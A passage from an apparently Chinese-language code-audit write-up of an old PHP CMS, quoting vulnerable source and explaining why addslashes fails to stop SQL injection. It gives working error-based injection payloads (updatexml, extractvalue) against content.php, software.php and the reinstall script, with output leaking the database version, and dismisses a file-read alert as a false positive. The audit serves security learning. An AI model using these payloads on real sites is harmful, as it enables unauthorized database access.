    //框中填写提交即可
下一个：
##### /admin/files/reply.php
无新意，不再提
下一个
##### /files/content.php
关键代码
    $id=addslashes($_GET['cid']);//addlashes()函数处理，难道没戏？
    $query = "SELECT * FROM content WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $content = mysql_fetch_array($resul);
    $navid=$content['navclass'];
    $query = "SELECT * FROM navclass WHERE id='$navid'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $navs = mysql_fetch_array($resul);
    //浏览计数
    $query = "UPDATE content SET hit = hit+1 WHERE id=$id";//啊这这这这。。。前面刚addlashes()处理，这里就不加单引号保护，
    @mysql_query($query) or die('修改错误：'.mysql_error());
    ?>
注意到两处：
    $id=addslashes($_GET['cid']);//addlashes()函数处理，难道没戏？
    $query = "UPDATE content SET hit = hit+1 WHERE id=$id";//啊这这这这。。。前面刚addlashes()处理，这里就不加单引号保护，那防了个寂寞，直接开注
    payload:
    http://127.0.0.1/index.php/?r=content&cid=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)
下一个
##### /admin/files/seniorset.php 和 /admin/files/site.php和/files/downlows.php
依旧无新意直接注入即可
下一个
##### /files/software.php
    $id=addslashes($_GET['cid']);
    $query = "SELECT * FROM download WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $download = mysql_fetch_array($resul);
默认情况下，PHP 指令 magic_quotes_gpc 为 on，对所有的 GET、POST 和 COOKIE 数据自动运行
addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用
addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。
因为这里被GET传值就已经默认运行`addslashes()`，所以再次使用`addslashes()`就不起作用了，所以我们依旧还是可以进行报错注入。
    payload：
     ?r=software&cid=1'or(updatexml(1,concat(0x7e,(select%20version()),0x7e),1))
下一个
##### /install/index.php重装注入
关键代码
    $conn = @mysql_connect($dbhost,$dbuser,$dbpwd) or die('数据库连接失败，错误信息：'.mysql_error());
    mysql_select_db($dbname) or die('数据库错误，错误信息：'.mysql_error());
    mysql_query('SET NAMES UTF8') or die('字符集设置错误'.mysql_error());
    $query = "UPDATE manage SET user='$user',password='$password',name='$user'";
    @mysql_query($query) or die('修改错误：'.mysql_error());
    echo "管理信息已经成功写入!";
user、password等变量未经过滤直接拼接，存在可利用注入。尝试利用（重装需要先删除/install目录下的InstallLock.txt文件，然后访问根目录，开始重装）
payload:
    1' or extractvalue(1,concat(0x7e,(select version()),0x7e))#
    请勿刷新及关闭浏览器以防止程序被中止，如有不慎！将导致数据库结构受损
    正在导入备份数据，请稍等！
    正在导入sql：seacms.sql
    数据库导入成功！
    正在导入sql：seacms.sql
    数据库导入成功！
    MySQL数据库连接配置成功!
    修改错误：XPATH syntax error: '~5.5.53~'
    //可以看到爆出数据库版本5.5.53
到此处，我能找到的sql相关的漏洞就结束了，说实话，这个cms不愧是足够老，足够适合新手，这sql漏洞基本没有防御。
#### 三、文件包含文件读取
##### /files/downloads.php
seay报警此文件有危险的任意文件包含，文件下载
看代码：
报警处在
    $fp = fopen("$sourceFile", "rb");  
    //设置指针位置  
    fseek($fp, $range);  
    //虚幻输出  
    while (!feof($fp)) {  
        //设置文件最长执行时间  
        set_time_limit(0);  
        print (fread($fp, 1024 * 8)); //输出文件  
        flush(); //输出缓冲  
        ob_flush();  
    }  
    fclose($fp);
fread()函数，字节输出文件，跟进变量$fp-->$sourceFile
    $houzhui=substr($fileadd,strrpos($fileadd,"."));
    $sourceFile = $fileadd; //要下载的临时文件名  
    $outFile = $filename." ".$filename2.$houzhui; //下载保存到客户端的文件名  
    $file_extension = strtolower(substr(strrchr($sourceFile, "."), 1)); //获取文件扩展名  
    ##### //echo $sourceFile;
继续跟进$fileadd-->$down
    $fileadd=$down['softadd'];
    $fileadd2=$down['softadd2'];
    if ($type=='soft' AND $line=='pan'){
    if ($fileadd2==""){
    echo "";
    exit;
继续$down
    $line=addslashes($_GET['line']);
    $type=addslashes($_GET['type']);
    $fileid=addslashes($_GET['cid']);
    if(!is_numeric($fileid)){
    echo "错误的下载请求！";
    exit;}
    $query = "SELECT * FROM download WHERE ( id='$fileid')";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $down= mysql_fetch_array($result);
    $fileadd=$down['softadd'];
    $fileadd2=$down['softadd2'];
跟进到此处，希望断绝，$down来自数据库查询结果$result,而$result的来源GET参数cid经过了addlashes()函数处理，变得不可控，因此此处变量实际不可控制，导致爆出的任意文件操作漏洞成为误报。并且由于addlashes()函数的存在，且后面的变量处理（"SELECT
* FROM download WHERE ( id='$fileid')"）严格，又导致刚刚有希望的sql注入希望破灭。
不纠结，下一个
##### /inc/db.class.php
seay爆此文件有任意文件操作漏洞，看一下代码：
    @param string $sql
       \* @param string $filename
       \* @param string $dir
       \* @return boolean
       */